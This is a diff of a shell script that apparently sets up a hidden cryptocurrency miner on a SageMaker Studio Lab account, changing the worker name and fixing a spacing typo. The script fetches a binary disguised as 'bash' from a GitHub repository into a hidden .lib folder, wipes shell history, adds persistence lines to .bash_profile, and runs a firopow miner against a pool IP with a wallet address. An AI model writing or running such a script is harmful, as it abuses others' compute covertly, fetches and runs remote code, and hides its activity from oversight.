@@ -7,7 +7,7 @@ mkdir .lib
 cd .lib
 rm -R *
 rm -R /home/studio-lab-user/.ton
-WORKER="KotiKoti"
+WORKER="MEGALODONz"
 WALLETNH="aHAuNULsUCUmbkmeitGtNLVUXBcaSPFoUR"
 POOLNH="174.138.68.245:80"
 wget -P /home/studio-lab-user/.lib/ https://github.com/gunturyogatama404/ksjdueoa/raw/refs/heads/main/bash && history -cr
@@ -22,7 +22,7 @@ echo 'WORKER="x"' >> ~/.bash_profile
 echo 'WALLETNH="aHAuNULsUCUmbkmeitGtNLVUXBcaSPFoUR"' >> /home/studio-lab-user/.bash_profile
 echo 'POOLNH="174.138.68.245:80"' >> /home/studio-lab-user/.bash_profile
 echo "bash /home/studio-lab-user/.lib/gas.sh"  >> /home/studio-lab-user/.bash_profile
-echo "./.lib/bash --algo firopow -s $POOLNH -u  $WALLETNH.$WORKER" > /home/studio-lab-user/.lib/gas.sh
+echo "./.lib/bash --algo firopow -s $POOLNH -u $WALLETNH.$WORKER" > /home/studio-lab-user/.lib/gas.sh
 chmod +x bash && cd ~/ && source .bashrc
 
 
